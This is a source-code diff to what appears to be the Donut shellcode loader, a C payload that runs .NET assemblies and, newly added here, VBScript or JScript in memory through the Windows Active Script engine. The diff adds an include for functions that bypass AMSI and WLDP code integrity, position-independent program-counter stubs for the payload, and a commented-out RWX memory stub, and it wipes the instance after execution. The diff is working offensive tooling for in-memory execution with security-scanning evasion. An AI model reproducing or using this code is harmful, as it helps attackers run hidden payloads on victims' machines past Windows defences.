@@ -36,6 +36,7 @@ DWORD ThreadProc(LPVOID lpParameter) {
     ULONG64             sig;
     PDONUT_INSTANCE     inst = (PDONUT_INSTANCE)lpParameter;
     DONUT_ASSEMBLY      assembly;
+    PDONUT_MODULE       mod;
     
     Memset(&assembly, 0, sizeof(assembly));
     
@@ -88,12 +89,29 @@ DWORD ThreadProc(LPVOID lpParameter) {
       if(!DownloadModule(inst)) return -1;
     }
     
-    if(LoadAssembly(inst, &assembly)) {
-      RunAssembly(inst, &assembly);
+    if(inst->type == DONUT_INSTANCE_PIC) {
+      DPRINT("Using module embedded in instance");
+      mod = (PDONUT_MODULE)&inst->module.x;
+    } else {
+      DPRINT("Loading module from allocated memory");
+      mod = inst->module.p;
     }
     
-    FreeAssembly(inst, &assembly);
-    
+    // exe or dll?
+    if(mod->type == DONUT_MODULE_NET_DLL || 
+       mod->type == DONUT_MODULE_NET_EXE)
+    {
+      if(LoadAssembly(inst, &assembly)) {
+        RunAssembly(inst, &assembly);
+      }
+      FreeAssembly(inst, &assembly);
+    } else 
+    // vbs or js?
+    if (mod->type == DONUT_MODULE_VBS ||
+        mod->type == DONUT_MODULE_JS)
+    {
+      RunScript(inst);
+    }
     // clear instance from memory
     Memset(inst, 0, inst->len);
     
@@ -109,7 +127,6 @@ BOOL LoadAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     DWORD           i;
     BOOL            loaded=FALSE, loadable, disabled;
     PBYTE           p;
-    HMODULE         hAMSI;
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -253,10 +270,10 @@ BOOL RunAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
     }
     
     DPRINT("Type is %s", 
-      mod->type == DONUT_MODULE_DLL ? "DLL" : "EXE");
+      mod->type == DONUT_MODULE_NET_DLL ? "DLL" : "EXE");
     
     // if this is a program
-    if(mod->type == DONUT_MODULE_EXE) {
+    if(mod->type == DONUT_MODULE_NET_EXE) {
       // get the entrypoint
       DPRINT("MethodInfo::EntryPoint");
       hr = pa->as->lpVtbl->EntryPoint(pa->as, &pa->mi);
@@ -627,6 +644,194 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
     return bResult;
 }
 
+/**
+typedef VOID (__cdecl *SetActiveScriptVtbl_t)(IActiveScriptSiteVtbl2*);
+
+PVOID SetActiveScriptVtblStub(PDONUT_INSTANCE inst, IActiveScriptSiteVtbl2 *vf_tbl) {
+    SetActiveScriptVtbl_t SetActiveScriptVtbl;
+    PBYTE                 cs;
+    
+    // 1. Allocate RWX memory for virtual functions
+    cs = (PBYTE)inst->api.VirtualAlloc(
+        NULL, inst->initScriptLen, 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE);
+        
+    // 2. If allocated, copy functions over
+    if(cs != NULL) {
+      Memcpy(cs, inst->initScript, inst->initScriptLen);
+      
+      // 3. Set pointer to initialization function and invoke.
+      //    Offset for both 32 and 64-bit is currently 0x4F
+      SetActiveScriptVtbl = 
+        (SetActiveScriptVtbl_t) cs;
+        
+      SetActiveScriptVtbl(vf_tbl);
+    }
+    return cs;
+}
+*/
+
+// forward reference to methods
+static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv);
+static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this);
+static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this);
+static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, LPCOLESTR objectName, DWORD dwReturnMask, IUnknown **objPtr, ITypeInfo **typeInfo);
+static STDMETHODIMP OnScriptError(IActiveScriptSite *this, IActiveScriptError *scriptError);
+static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *lcid);
+static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version);
+static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, const VARIANT *pvr, const EXCEPINFO *pei);
+static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state);
+static STDMETHODIMP OnEnterScript(IActiveScriptSite *this);
+static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this);
+
+VOID RunScript(PDONUT_INSTANCE inst) {
+    HRESULT	               hr;
+    IActiveScriptParse     *parser;
+    IActiveScript		       *engine;
+    MyIActiveScriptSite    mas;
+    IActiveScriptSiteVtbl2 vf_tbl;
+    PDONUT_MODULE          mod;
+    
+    if(inst->type == DONUT_INSTANCE_PIC) {
+      DPRINT("Using module embedded in instance");
+      mod = (PDONUT_MODULE)&inst->module.x;
+    } else {
+      DPRINT("Loading module from allocated memory");
+      mod = inst->module.p;
+    }
+
+    // 1. Initialize IActiveScriptSiteVtbl2 and assign to lpVtbl pointer
+    //    Create event for when script ends
+    vf_tbl.QueryInterface      = ADR(ULONG_PTR, QueryInterface);
+    vf_tbl.AddRef              = ADR(ULONG_PTR, AddRef);
+    vf_tbl.Release             = ADR(ULONG_PTR, Release);
+    vf_tbl.GetLCID             = ADR(ULONG_PTR, GetLCID);
+    vf_tbl.GetItemInfo         = ADR(ULONG_PTR, GetItemInfo);
+    vf_tbl.GetDocVersionString = ADR(ULONG_PTR, GetDocVersionString);
+    vf_tbl.OnScriptTerminate   = ADR(ULONG_PTR, OnScriptTerminate);
+    vf_tbl.OnStateChange       = ADR(ULONG_PTR, OnStateChange);
+    vf_tbl.OnScriptError       = ADR(ULONG_PTR, OnScriptError);
+    vf_tbl.OnEnterScript       = ADR(ULONG_PTR, OnEnterScript);
+    vf_tbl.OnLeaveScript       = ADR(ULONG_PTR, OnLeaveScript);
+    
+    // 2. Initialize COM, MyIActiveScriptSite and event for OnLeaveScript method
+    inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    
+    mas.site.lpVtbl    = (IActiveScriptSiteVtbl*)&vf_tbl;
+    mas.siteWnd.lpVtbl = NULL;
+    mas.hEvent         = inst->api.CreateEvent(NULL, FALSE, FALSE, NULL);
+    mas._SetEvent      = (SetEvent_t)inst->api.SetEvent;
+    
+    // 3. Instantiate the active script engine
+    hr = inst->api.CoCreateInstance(
+      &inst->xCLSID_ScriptLanguage, 0, CLSCTX_ALL, 
+      &inst->xIID_IActiveScript, (void **)&engine);
+      
+    if(hr == S_OK) {
+      // 4. Get IActiveScriptParse object from engine
+		  hr = engine->lpVtbl->QueryInterface(
+        engine, 
+        #ifdef _WIN64
+        &inst->xIID_IActiveScriptParse64,
+        #else
+        &inst->xIID_IActiveScriptParse32,
+        #endif      
+        (void **)&parser);
+        
+      if(hr == S_OK) {
+        // 5. Initialize parser
+        hr = parser->lpVtbl->InitNew(parser);
+				if(hr == S_OK) {
+          // 6. Set custom script interface
+          hr = engine->lpVtbl->SetScriptSite(
+            engine, (IActiveScriptSite *)&mas);
+          if(hr == S_OK) {
+            // 7. Load script
+            hr = parser->lpVtbl->ParseScriptText(
+              parser, (LPCOLESTR)mod->data, 0, 0, 0, 0, 0, 0, 0, 0);
+            if(hr == S_OK) {
+              // 8. Run script
+              hr = engine->lpVtbl->SetScriptState(
+                engine, SCRIPTSTATE_CONNECTED);
+                
+              // 9. Wait for script to end
+              inst->api.WaitForSingleObject(mas.hEvent, INFINITE);
+            }
+          }
+        }
+        parser->lpVtbl->Release(parser);
+      }
+      engine->lpVtbl->Close(engine);
+      engine->lpVtbl->Release(engine);
+    }
+    inst->api.CloseHandle(mas.hEvent);
+}
+
+static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv) {
+    DPRINT("QueryInterface");
+    return E_NOTIMPL;
+}
+
+static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this) {
+    DPRINT("AddRef");
+    return 1;
+}
+
+static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this) {
+    DPRINT("Release");
+    return 0;
+}
+
+static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, 
+  LPCOLESTR objectName, DWORD dwReturnMask, 
+  IUnknown **objPtr, ITypeInfo **typeInfo) {
+    DPRINT("GetItemInfo");
+    return TYPE_E_ELEMENTNOTFOUND;
+}
+
+static STDMETHODIMP OnScriptError(IActiveScriptSite *this, 
+  IActiveScriptError *scriptError) {
+    DPRINT("OnScriptError");
+    return S_OK;
+}
+
+static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *lcid) {
+    DPRINT("GetLCID");
+    return S_OK;
+}
+
+static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version) {
+    DPRINT("GetDocVersionString\n");
+    return S_OK;
+}
+
+static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, 
+  const VARIANT *pvr, const EXCEPINFO *pei) {
+    DPRINT("OnScriptTerminate()\n");
+    return S_OK;
+}
+
+static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state) {
+    DPRINT("OnStateChange\n");
+    return S_OK;
+}
+
+static STDMETHODIMP OnEnterScript(IActiveScriptSite *this) {
+    DPRINT("OnEnterScript()\n");
+    return S_OK;
+}
+
+static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
+    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
+    
+    DPRINT("OnScriptLeave()\n");
+    
+    mas->_SetEvent(mas->hEvent);
+    
+    return S_OK;
+}
+
 // locate address of API in export table
 LPVOID FindExport(PDONUT_INSTANCE inst, LPVOID base, ULONG64 api_hash, ULONG64 iv){
     PIMAGE_DOS_HEADER       dos;
@@ -745,6 +950,58 @@ LPVOID xGetProcAddress(PDONUT_INSTANCE inst, ULONG64 ulHash, ULONG64 ulIV) {
     }
     return addr;
 }
+
+// functions to bypass AMSI and WLDP code integrity
+#include "bypass.h"
+
+// Function to return the program counter.
+// Always placed at the end of payload.
+// Tested with x86 and x64 builds of MSVC 2017 and MinGW. YMMV
+#if defined(_MSC_VER) 
+  #if defined(_M_X64)
+
+    #define PC_CODE_SIZE 9 // sub rsp, 40 / call get_pc
+
+    static char *get_pc_stub(void) {
+      return (char*)_ReturnAddress() - PC_CODE_SIZE;
+    }
+    
+    static char *get_pc(void) {
+      return get_pc_stub();
+    }
+
+  #elif defined(_M_IX86)
+    __declspec(naked) static char *get_pc(void) {
+      __asm {
+          call   pc_addr
+        pc_addr:
+          pop    eax
+          sub    eax, 5
+          ret
+      }
+    }
+  #endif  
+#elif defined(__GNUC__) 
+  #if defined(__x86_64__)
+    __attribute__((naked)) static char *get_pc(void) {
+        __asm__ (
+        "call   pc_addr\n"
+      "pc_addr:\n"
+        "pop    %rax\n"
+        "sub    $5, %rax\n"
+        "ret");
+    }
+  #elif defined(__i386__)
+    __attribute__((naked)) static char *get_pc(void) {
+        __asm__ (
+        "call   pc_addr\n"
+      "pc_addr:\n"
+        "popl   %eax\n"
+        "subl   $5, %eax\n"
+        "ret");
+    }
+  #endif
+#endif
 
 // the following code is *only* for development purposes
 // given an instance file, it will run as if running on a target system
